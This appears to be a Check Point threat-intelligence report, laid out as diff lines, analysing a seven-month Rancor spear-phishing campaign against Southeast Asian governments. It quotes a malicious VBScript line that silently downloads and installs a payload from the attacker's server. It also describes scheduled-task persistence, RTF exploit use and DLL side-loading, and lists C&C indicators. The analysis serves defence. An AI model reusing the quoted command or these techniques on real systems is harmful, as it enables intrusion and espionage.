@@ -1,0 +1,82 @@
+Earlier this year, Check Point researchers identified a targeted and extensive attack against Southeast Asian government entities over the span of 7 months.
+The attackers, which we believe are members of the Rancor threat group, used classic spear-phishing to reach their victims, but have invested many of their efforts into making the e-mails and lure documents appear as convincing as possible, and by changing their TTPs over time.
+Rancor is a threat group active since at least 2017, and was previously observed carrying attacks Singapore and Cambodia, which are believed to be espionage motivated.
+In this report, we will provide a deep dive analysis of the initial attack methods, infrastructure, and artifacts used against the targets in the latest campaign we discovered and attributed to this group.
+In addition, we will share some insights that might indicate the Rancor APT group is of a Chinese origin.
+The observed attacks started with e-mails sent on behalf of employees from different government departments, embassies, or government-related entities in a Southeast Asian country.
+The attackers appeared determined to reach certain targets, as tens of e-mails were sent to employees under the same ministries.
+Furthermore, the e-mails’ origin was likely spoofed to make them seem more reliable.
+This extensive persistent campaign, which was ongoing for more than 7 months, continued to evolve over time, mutating its TTPs, which at times even appeared unrelated until extended analysis.
+Though hundreds of files were involved in these attacks, the following flow-chart summarizes the better part of the possible attack combination observed throughout the campaign:
+The delivery documents relied on macros and known vulnerabilities to run malicious code on the infected system.
+What was most interesting about them, however, was the decoy content they used.
+Most of the documents contained legitimate government-related topics, such as instructions for governmental employees, official letters, press releases, surveys, and more.
+Fig 3: Legitimate looking decoy document
+Analyzing the timeline of the campaign uncovered 8 major variants of TTPs (delivery, persistence and payload) in different combinations.
+Each mini-campaign was not limited to a single target, and the attackers went after multiple government entities simultaneously, using the same TTPs.
+Below is a summary of each such cluster, and the time range in which it was observed:
+Fig 4: 1st cluster infection chain
+The earliest documents observed on December 2018 and attributed to this campaign contained a short macro that executed the value found under the Company field in the document’s properties:
+Fig 5: Commands hidden in the document Metadata
+The command in the Company field saves a VBScript file to the temp directory, and schedules a task to run it every two minutes.
+The VBS file simply downloads a second-stage MSI payload from the attacker’s server and executes it using msiexec:
+Set a=CreateObject("Wscript.Shell"):a.Run "msiexec /q /i https://p=/45.125.65[.
+The MSI payload (c96c01df9d7eeb60258dcf8ce2ccbb2e78bb5f87) was created using the Advanced Installer tool, which allows wrapping a PowerShell script into an MSI installer.
+This script receives instructions from the C&C server, and uploads the execution result along with the user machine information:
+By the time we discovered this sample, the C&C was unreachable and we were unable to download the final stage payload, but looking at other files that were hosted on the same C2, led us to a related DLL (70bdce0f974dd0faac5684e6ca0b3476b8a12564).
+This DLL acts like a loader and tries to download an additional DLL file from www.chinhphumofa.esmtp[.
+]biz and execute the RunningThread function (later referred to as RunningThread Loader).
+Fig 6: 2nd cluster infection chain
+During January and March, the attackers introduced new macro code and the intermediate MSI stage was removed.
+The Document_Open function in the macro contains base64-encoded blob which is decoded and saved as a .js file.
+This time the command to create a scheduled task is executed from the Comments property of the document, and it tries to add the same task with two different permissions, thus making sure that the inserted task would utilize the higher permissions if available:
+The Chrome.js file contains a PowerShell backdoor similar to the one in the previous version.
+In both scheduled tasks, the name, filename and URL patterns of the C&C communication are trying to mimic Google Chrome updates:
+ Similar URL patterns were seen throughout the campaign.
+Fig 7: 3rd cluster infection chain
+In the next wave, the attackers added documents that exploit known vulnerabilities in MS Equation Editor to their arsenal.
+The documents are created using the known 8.t RTF weaponizer.
+As soon as the malicious RTF document is opened, the exploit triggers the execution of the 8.t payload, creating two additional files: C:\Windows\tracing\OneDriveApp.vbs and C:\Windows\tracing\OneDriveApp.ps1.
+As in previous stages, the PowerShell payload has the same functionality to communicate with the C&C, and depending on the sample mimics different Google or Microsoft applications.
+Fig 8: 4th cluster infection chain
+The attack is carried by RTF documents with the same MS Equation Editor exploit builder that was used before.
+Upon execution, it drops two files into the temp folder: wsc_proxy.exe and wsc.dll.
+wsc_proxy.exe is a legitimate Avast Antivirus executable.
+Using DLL side-loading, the malicious payload wsc.dll is started.
+The wsc.dll itself is a loader for another DLL executing the RunningThread exported function (the same function name from cluster 1).
+This infection chain was previously described by @sebdraven.
+DLL side-loading is widely used to evade security programs that monitor the behaviors of executed files: some of them are white-listed, signed or trusted files, which thereby might lead to the exclusion of malware loaded by these files from behavioral monitoring.
+Fig 9: 5th-8th cluster infection chains
+During the months of May and June, Rancor continued to introduce new infection chains that are visualized above.
+In one case, the attackers turned to Cobalt Strike Beacon as their second stage payload.
+In another case, where the Bitdefender legitimate executable was used, it was downloaded from a GitHub account possibly created by the attackers specifically for this campaign: https://raw.githubusercontent[.
+]com/watchdogmanoo/watcherdog/master/WatchDog.exe.When DLL side-loading was used, the malicious DLL was in charge of downloading and executing two additional plugins internally named as “nbf.plugin” and “nbs.plugin”.
+Fig 10: GitHub repository used to serve a legitimate Bitdefender executable
+Besides going after the same government targets, we observed a lot of similarities between the different clusters we detailed above.
+Below is a visualization of the connections we found between the different clusters:
+Fig 11: Maltego graph – connecting the clusters
+Zooming in on the infrastructure connection, we see that the first and fourth versions of the attack (clusters 1 and 4 in the diagram below), can be connected via multiple passive DNS hops, or by a Rancor Loader to the C&C domain www.chinhphumofa.esmtp[.
+]biz, which in turn can be connected via passive DNS resolution to the originally reported Rancor C&C domain: www.microsoft.https443[.
+Fig 12: Maltego graph – infrastructure connecting to previous campaign
+Searching for MSI files which encapsulate PowerShell code (as was described in Cluster 1), led us to a sample that communicated with the IP address 199.247.6[.
+]253 which is a known C&C used by Rancor group:
+Fig 13: PowerShell code connecting to Rancor
+Another similarity to the previous campaign is the creation of scheduled tasks by running the command schtasks twice to gain execution with SYSTEM privileges if possible.
+In both cases the scheduled task was set to execute every 2 minutes:
+Fig 14: Similarity in schedule task creation technique
+Finally, as in the previous campaign, our campaign utilized similar macro code technique in the delivery documents, in order to execute the shell command stored in the Company metadata of the document:
+Fig 15: Similar macro code
+As Rancor was not strongly attributed to any origin as of yet, we would like to offer some insights which might give us indication that we are looking into a Chinese threat group.
+During our analysis, we noticed an interesting sample which might indicate some connection in activity between this Rancor campaign and the previous activity by the Goblin Panda group (AKA 1937CN by some vendors).
+The sample b49c148db0b4eec53815dd1a2630c63d25cda78e (found on VirusTotal) is an RTF document created by the aforementioned 8.t exploit builder, but utilized a loader which is attributed to the Goblin Panda group.
+The interesting part is that the metadata of the RTF file in question exhibits the same unique Last Modified By information as we’ve seen in our Rancor campaign — “AntiSec”.
+Rancor group, which was previously spotted attacking Cambodia and Singapore, continued its targeted attacks against entities within the Southeast Asia region, this time concentrating 7 months of efforts on the Southeast Asian government sector.
+Dozens of emails sent from government officials and containing politically-themed decoy documents were supposed to trick victims into opening them and loading malicious components providing full access to victims’ machines.
+During our research we uncovered multiple leads fortifying the assumption that the Rancor group activity is indeed of a Chinese origin.
+We expect the group to continue to evolve, constantly changing their TTPs in the same manner as we observed throughout the campaign, as well as pushing their efforts to bypass security products and avoid attribution.
+The malware used in this attack was caught using Check Point’s Threat Emulation and Threat Extraction.
+Threat Emulation is an innovative zero-day threat sandboxing capability, used by SandBlast Network to deliver the best possible catch rate for threats, and is virtually immune to attackers’ evasion techniques.
+As part of the Check Point SandBlast Zero-Day Protection solution, Threat Emulation prevents infections from new malware and targeted attacks.
+The Threat Extraction capability removes exploitable content, including active content and embedded objects, reconstructs files to eliminate potential threats, and promptly delivers sanitized content to users to maintain business flow.
+© 1994 Check Point Software Technologies LTD. All rights reserved.
+Property of CheckPoint.com | Privacy Policy
